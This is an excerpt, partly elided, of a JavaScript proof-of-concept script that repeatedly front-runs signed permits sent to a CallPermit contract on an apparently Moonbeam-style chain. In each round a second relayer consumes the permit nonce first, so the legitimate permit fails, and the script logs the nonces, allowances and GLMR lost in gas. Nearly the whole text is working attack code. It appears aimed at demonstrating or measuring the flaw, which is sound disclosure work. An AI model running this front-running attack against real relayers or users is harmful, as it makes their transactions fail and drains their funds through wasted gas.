...
async function sendLegacy(api, wallet, to, data, gasLimit = 300000n) {
  const { nonce, balance: balBefore } = await accountBasic(api, wallet.address);
  ...
  const { balance: balAfter } = await accountBasic(api, wallet.address);
  const gasUsedWei = balBefore - balAfter;
  const gasUsed = GAS_PRICE > 0n ? gasUsedWei / GAS_PRICE : 0n;
  return {
    txHash,
    exitReason,
...
async function main() {
  ...
  for (let round = 1; round <= TOTAL_ROUNDS; round++) {
    ...
    const permitAHash = ethers.keccak256(calldataA);
    const permitBHash = ethers.keccak256(calldataB);

    // RelayerB front-runs: consumes nonce N
    const nonceBeforeB = await getPermitNonce(api, attacker.address);
    const txB = await sendLegacy(api, relayerB, CALLPERMIT, calldataB);

    if (!isSucceed(txB.exitReason)) {
      console.log(`[${round}] PermitB FAILED unexpectedly — skip: ${JSON.stringify(txB.exitReason)}`);
      rounds.push({ round, nonce: nonce.toString(), skipped: true, reason: "PermitB failed", txB });
      continue;
    }

    const nonceAfterB  = await getPermitNonce(api, attacker.address);
    const allowanceAfterB = await getAllowance(api, attacker.address, MOONBEANS);
    const nonceConsumed = nonceAfterB === nonceBeforeB + 1n;
    const allowanceZero = allowanceAfterB === 0n;

    if (!nonceConsumed) {
      console.log(`[${round}] WARNING: nonce not consumed (before=${nonceBeforeB} after=${nonceAfterB})`);
    }
    ...
    const lostWei  = BigInt(txA.gasUsedWei);
    ...
    if (round <= 5 || round % 100 === 0) {
      ...
      console.log(
        ...
        ` nonce=${nonceBeforeB}→${nonceAfterB}→${nonceAfterA}` +
        ` allowance=${allowanceAfterB}` +
    ...
    rounds.push({
      ...
      permitB: {
        txHash:        txB.txHash,
        exitReason:    txB.exitReason,
        gasUsed:       txB.gasUsed,
        calldataHash:  txB.calldataHash,
        nonceConsumed,
        allowanceAfter: allowanceAfterB?.toString() ?? "unknown",
        allowanceZero,
      },
      permitA: {
        txHash:       txA.txHash,
        exitReason:   txA.exitReason,
        gasUsed:      txA.gasUsed,
        gasUsedWei:   txA.gasUsedWei,
        glmrLost:     ethers.formatEther(lostWei),
        calldataHash: txA.calldataHash,
        status:       txFailed ? "FAIL" : "SUCCESS",
        nonceAfter:   nonceAfterA.toString(),
        nonceUnchanged: nonceAfterA === nonceAfterB,
      },
    });
  }
